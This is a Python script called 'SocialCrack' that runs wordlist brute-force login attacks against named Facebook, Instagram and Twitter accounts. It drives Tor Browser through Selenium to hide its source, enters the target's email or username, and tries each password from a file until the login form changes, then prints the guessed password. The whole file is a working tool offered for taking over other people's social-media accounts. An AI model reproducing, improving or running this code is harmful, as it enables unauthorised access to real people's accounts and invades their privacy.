"""
Social-Media Bruteforcer
@AUTHOR crypt0sploit
@DATE 1 Mar 2019
"""

from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from tbselenium.tbdriver import TorBrowserDriver
import sys
import time
import pyautogui

class brute_bot(object):

    def __init__(self, email, password, site, email_field, pass_field):
        self.email = email
        self.password = password
        self.site = site
        self.email_field = email_field
        self.pass_field = pass_field     
        self.driver = TorBrowserDriver('/root/tor-browser_en-US/')

    def Close_Browser(self):
        self.driver.close()

    def bruteforcer(self):
        driver = self.driver
        pass_found = False

        while not pass_found:
            driver.get(self.site)
            time.sleep(3)
            for i in self.password:
                try:
                    email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
                    email_box.clear()
                    email_box.send_keys(self.email)   
                    password_box = driver.find_element_by_xpath(f"//input[@name='{self.pass_field}']")
                    password_box.clear()
                    password_box.send_keys(i)
                    pyautogui.press('enter')
                    time.sleep(4)
                    old = i 
                    print(f"Trying - {i}") 
                except NoSuchElementException: 
                    pass_found = True 
                    if pass_found == True: 
                        print(f'Password is >> {old} ')
                        break

banner = """\n\t

   _____            _       _  _____                _    
  / ____|          (_)     | |/ ____|              | |   
 | (___   ___   ___ _  __ _| | |     _ __ __ _  ___| | __
  \___ \ / _ \ / __| |/ _` | | |    | '__/ _` |/ __| |/ /
  ____) | (_) | (__| | (_| | | |____| | | (_| | (__|   < 
 |_____/ \___/ \___|_|\__,_|_|\_____|_|  \__,_|\___|_|\_\\
                                                         
            AUTHOR --> crypt0sploit ( Adrian )
            INSTAGRAM --> _adyadrian_aa

"""

def main_menu():

    if sys.argv[1] == "facebook":
        site = "https://www.facebook.com"
        print(banner)
        print("Waking up BOT...")
        efield = 'email'
        pfield = 'pass'
        time.sleep(2)
        email1 = str(input("\nThe Email Address/ Phone NUMBER of the target >> "))
        target = open(sys.argv[2], 'r')
        readpass = target.readlines()
        execute = brute_bot(email1, readpass, site, efield, pfield)
        execute.bruteforcer()

    elif sys.argv[1] == "instagram":
        site = "https://www.instagram.com/accounts/login/"
        print(banner)
        print("Waking up BOT...")
        efield = 'username'
        pfield = 'password'
        time.sleep(2)
        email1 = str(input("\nThe Username of the Target >> "))
        target = open(sys.argv[2], 'r')
        readpass = target.readlines()
        execute = brute_bot(email1, readpass, site, efield, pfield)
        execute.bruteforcer()
    
    elif sys.argv[1] == "twitter":
        site = "https://twitter.com/login/"
        print(banner)
        print("Waking up BOT...")
        efield = 'username_or_email'
        pfield = 'password'
        time.sleep(2)
        email1 = str(input("\nThe Username/Email of the Target >> "))
        target = open(sys.argv[2])
        readpass = target.readlines()
        execute = brute_bot(email1, readpass, site, efield, pfield)
        execute.bruteforcer()

    else:
        print("Wrong argv !!")
        exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except IndexError:
        print(f"""
        {banner}
        \nWelcome to the SocialCrack help menu:
        Usage:
            Facebook:     python3 SocialCrack.py facebook /path/to/your/wordlist.txt
            Instagram:    python3 SocialCrack.py instagram /path/to/your/wordlist.txt
            Twitter:      python3 SocialCrack.py twitter /path/to/your/wordlist.txt
        """)
